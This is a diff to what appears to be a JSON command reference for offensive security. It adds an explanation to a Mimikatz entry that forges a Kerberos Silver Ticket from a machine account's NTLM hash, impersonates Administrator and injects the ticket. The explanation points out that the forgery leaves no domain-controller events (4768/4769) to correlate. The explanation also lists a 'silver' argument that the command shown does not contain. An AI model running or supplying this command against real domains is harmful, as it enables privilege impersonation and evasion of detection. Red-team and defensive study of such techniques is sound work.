@@ -125,5 +125,6 @@
       "label": "Mimikatz",
       "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<host_fqdn> /service:cifs /rc4:<machine_hash> /ptt"
     }
-  ]
+  ],
+  "explain": "Forges a Silver Ticket - a TGS for one service, signed with that service account's hash - bypassing the KDC entirely (quieter than golden):\n  silver                    forge a service ticket offline\n  /service:<spn>           the target SPN (e.g. cifs/<host> for file access)\n  /rc4:<nt_hash>           the service/machine account's NTLM hash\n  /sid:<domain_sid>        the domain SID\n  /user:Administrator      the user to impersonate to that service\n  /domain:<domain> /ptt    the domain, and inject the ticket\nNo AS/TGS request ever reaches a DC, so there is no 4768/4769 to correlate; access is limited to that one service."
 }
